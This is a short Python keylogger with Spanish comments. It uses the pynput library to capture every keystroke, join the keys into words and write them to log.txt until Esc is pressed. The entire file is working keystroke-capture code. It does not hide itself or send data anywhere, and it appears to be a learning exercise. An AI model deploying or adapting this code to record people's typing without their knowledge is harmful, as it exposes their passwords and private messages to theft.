import pynput.keyboard
#trabajar con palabras
log_file = open('log.txt','w+')
lista_tecla=[] #En esta lista se guardaran las palabras
def imprimir():
    tecla = ''.join(lista_tecla)
    log_file.write(tecla)
    log_file.write("\n")
    log_file.close()
def presiona(key):
    key1 = convertir(key)
    #Key es con la letra k en mayuscula
    if key1 == "Key.esc":
        print("Saliendo...")
        imprimir()
        return False
    #Si es igual al espacio
    elif key1 == "Key.space":
        lista_tecla.append(" ")
    #si le da un enter
    elif key1 == "Key.enter":
        lista_tecla.append("\n")
    #Si es igual a una letra
    else:
        lista_tecla.append(key1)

def convertir(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

with pynput.keyboard.Listener(on_press=presiona) as liste:
    liste.join()
